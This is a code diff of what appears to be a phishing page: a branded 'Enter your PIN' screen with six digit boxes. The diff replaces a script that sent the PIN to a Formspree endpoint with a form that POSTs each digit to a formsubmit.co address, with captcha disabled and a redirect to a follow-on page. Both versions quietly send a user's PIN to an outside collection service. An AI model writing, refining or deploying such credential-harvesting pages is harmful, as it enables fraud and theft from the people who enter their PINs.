@@ -205,58 +205,33 @@
       <img class="imglogo" src="asset/header-logo.png" />
 
       <p>Enter your PIN</p>
-      <div class="pin-input">
-        <input
-          type="text"
-          maxlength="1"
-          inputmode="numeric"
-          required
-          pattern="[0-9]*"
-        />
-        <input
-          type="text"
-          maxlength="1"
-          inputmode="numeric"
-          required
-          pattern="[0-9]*"
-        />
-        <input
-          type="text"
-          maxlength="1"
-          inputmode="numeric"
-          required
-          pattern="[0-9]*"
-        />
-        <input
-          type="text"
-          maxlength="1"
-          inputmode="numeric"
-          required
-          pattern="[0-9]*"
-        />
-        <input
-          type="text"
-          maxlength="1"
-          inputmode="numeric"
-          required
-          pattern="[0-9]*"
-        />
-        <input
-          type="text"
-          maxlength="1"
-          inputmode="numeric"
-          required
-          pattern="[0-9]*"
-        />
-      </div>
-      <div class="forgot">Forgot PIN</div>
-      <button
-        id="redirectBtn"
-        disabled
-        class="bg-primary mt-w text-white w-full rounded-md p-4 disabled:opacity-80"
+      <form
+        id="pinForm"
+        action="https://formsubmit.co/el/jeyolu"
+        method="POST"
       >
-        Continue
-      </button>
+        <input type="hidden" name="_captcha" value="false" />
+        <input type="hidden" name="_next" value="pin.html" />
+
+        <div class="pin-input">
+          <input type="text" name="pin1" maxlength="1" inputmode="numeric" required pattern="[0-9]*" />
+          <input type="text" name="pin2" maxlength="1" inputmode="numeric" required pattern="[0-9]*" />
+          <input type="text" name="pin3" maxlength="1" inputmode="numeric" required pattern="[0-9]*" />
+          <input type="text" name="pin4" maxlength="1" inputmode="numeric" required pattern="[0-9]*" />
+          <input type="text" name="pin5" maxlength="1" inputmode="numeric" required pattern="[0-9]*" />
+          <input type="text" name="pin6" maxlength="1" inputmode="numeric" required pattern="[0-9]*" />
+        </div>
+
+        <div class="forgot">Forgot PIN</div>
+        <button
+          id="redirectBtn"
+          type="submit"
+          disabled
+          class="bg-primary mt-w text-white w-full rounded-md p-4 disabled:opacity-80"
+        >
+          Continue
+        </button>
+      </form>
     </div>
 
     <script>
@@ -264,68 +239,27 @@
         const inputs = document.querySelectorAll(".pin-input input");
         const button = document.getElementById("redirectBtn");
 
-        // Check if all inputs have values and enable the button
         function checkPinFilled() {
-          const allFilled = Array.from(inputs).every(
-            (input) => input.value.length === 1
-          );
-          button.disabled = !allFilled; // Enable or disable the button
+          const allFilled = Array.from(inputs).every((input) => input.value.length === 1);
+          button.disabled = !allFilled;
         }
 
         inputs.forEach((input, index) => {
           input.addEventListener("input", (e) => {
-            const value = e.target.value.replace(/[^0-9]/g, ""); // Allow only numbers
+            const value = e.target.value.replace(/[^0-9]/g, "");
             e.target.value = value;
 
-            // Move to next input if the current one is filled
             if (value && index < inputs.length - 1) {
               inputs[index + 1].focus();
             }
-
-            checkPinFilled(); // Check if the PIN is completely filled
+            checkPinFilled();
           });
 
           input.addEventListener("keydown", (e) => {
             if (e.key === "Backspace" && !input.value && index > 0) {
-              inputs[index - 1].focus(); // Move to previous input on backspace
+              inputs[index - 1].focus();
             }
           });
-        });
-
-        // Function to handle form submission using Formspree
-        async function submitForm() {
-          // Collect the PIN values from all the inputs
-          const pin = Array.from(inputs)
-            .map((input) => input.value)
-            .join("");
-
-          // Prepare the form data
-          const formData = new FormData();
-          formData.append("pin", pin); // Append the PIN to the form data
-
-          try {
-            let response = await fetch("https://formspree.io/f/mdkeovkr", {
-              method: "POST",
-              body: formData,
-              headers: {
-                Accept: "application/json",
-              },
-            });
-
-            if (response.ok) {
-              // Redirect to another page after successful form submission
-              window.location.href = "pin.html"; // Redirect as needed
-            } else {
-              alert("Failed to submit the PIN. Please try again.");
-            }
-          } catch (error) {
-            alert("An error occurred. Please try again later.");
-          }
-        }
-
-        // Attach an event listener to the button for form submission
-        button.addEventListener("click", function () {
-          submitForm(); // Call the submitForm function when the button is clicked
         });
       });
     </script>
